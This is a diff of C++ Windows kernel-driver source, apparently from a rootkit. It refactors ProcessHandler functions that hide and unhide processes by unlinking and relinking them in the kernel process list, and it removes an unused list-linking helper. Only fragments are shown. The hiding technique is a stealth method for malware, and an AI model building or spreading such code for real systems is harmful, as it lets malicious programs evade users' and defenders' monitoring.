@@ -120,7 +120,7 @@ NTSTATUS ProcessHandler::HideProcess(_In_ ULONG pid) {
 	}
 
 	__try {
-		status = RemoveEntryList(processListEntry) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
+		RemoveEntryList(processListEntry);
 	}
 	__except (EXCEPTION_EXECUTE_HANDLER) {
 		status = GetExceptionCode();
@@ -175,7 +175,6 @@ NTSTATUS ProcessHandler::UnhideProcess(_In_ ULONG pid) {
 	ExAcquirePushLockExclusive(listLock);
 
 	InsertHeadList(processListEntry, entryToRestore->OriginalEntry);
-	// AddListLinks(entryToRestore, processListEntry);
 
 	ExReleasePushLockExclusive(listLock);
 	ObDereferenceObject(targetProcess);
@@ -525,28 +524,6 @@ bool ProcessHandler::ListHiddenProcesses(_Inout_ IoctlProcessList* processList) 
 
 	processList->Count = count;
 	return true;
-}
-
-/*
-* Description:
-* AddListLinks is responsible for modifying the list by connecting an entry to specific target.
-*
-* Parameters:
-* @current [PLIST_ENTRY] -- Current process entry.
-*
-* Returns:
-* There is no return value.
-*/
-void ProcessHandler::AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target) {
-	PLIST_ENTRY next;
-
-	next = target->Flink;
-
-	current->Blink = target;
-	current->Flink = next;
-
-	next->Blink = current;
-	target->Flink = current;
 }
 
 /*
